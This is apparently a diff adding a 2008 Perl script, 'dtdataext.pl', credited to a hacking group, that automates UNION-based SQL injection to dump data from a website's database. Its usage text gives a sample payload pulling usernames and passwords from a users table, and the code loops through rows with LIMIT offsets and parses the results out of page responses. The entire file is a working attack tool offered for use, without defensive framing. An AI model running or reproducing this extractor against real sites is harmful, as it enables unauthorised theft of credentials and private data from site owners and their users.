@@ -1,0 +1,55 @@
+##############################################################################
+#----------------------------------------------------------------------------#
+##############################################################################
+# * VERSION: v.1
+# * LICENSE: GNU General Public License
+# * FILENAME: dtdataext.pl
+# * CONTACT: Letsgorun@gmail.com (French / English )
+# * THNX : - F. & D. Members of Dream_Team (t-underground-n)
+# - Darkc0de Forum Team
+##############################################################################
+#----------------------------------------------------------------------------#
+##############################################################################
+use LWP::UserAgent;
+use IO::Socket;
+system("clear");
+print "##########################################################\n";
+print "# dtdataext.pl- SQL Data extractor #\n";
+print "# By LetsGorun [Dream_Team] v1~2008#\n";
+print "##########################################################\n\n";
+
+if (@ARGV < 3)
+{
+print " Usage : \n";
+print " dtdataext.pl <URl> <column1> <column2>\n";
+print "\n";
+print " <URL> - payload http://www.site.com/news.php?id=-1+union+select+1,LETSGO,3+from+users\n";
+print " <column1> First Column exp: username \n";
+print " <column2> Second Column exp: password \n";
+print "########################################################\n\n";
+exit();
+}
+
+$url = $ARGV[0];
+$c1 = $ARGV[1];
+$c2 = $ARGV[2];
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0');
+$url =~ s/LETSGO/concat(char(58),char(58),char(58),$c1,char(58),$c2,char(58),char(58),char(58))/g;
+$i=0;$val=0;
+print "[-] Starting Extraction Data...\n";
+while ($val!=1)
+{
+$urlnew = $url."+limit+$i,1/*";
+$res = $b->request(HTTP::Request->new(GET=>$urlnew));
+$answer = $res->content;
+if ($answer =~ /:::(\w.*?):::/){
+print "\n\t[$i] $1";
+}else { $val=1; }
+$i++;
+}
+print "\n\n";
+print "[-] End.\n\n";
+print "##########################################################\n";
+print "#----------------- By Dream Team ------------------------#\n";
+print "##########################################################\n\n\n";
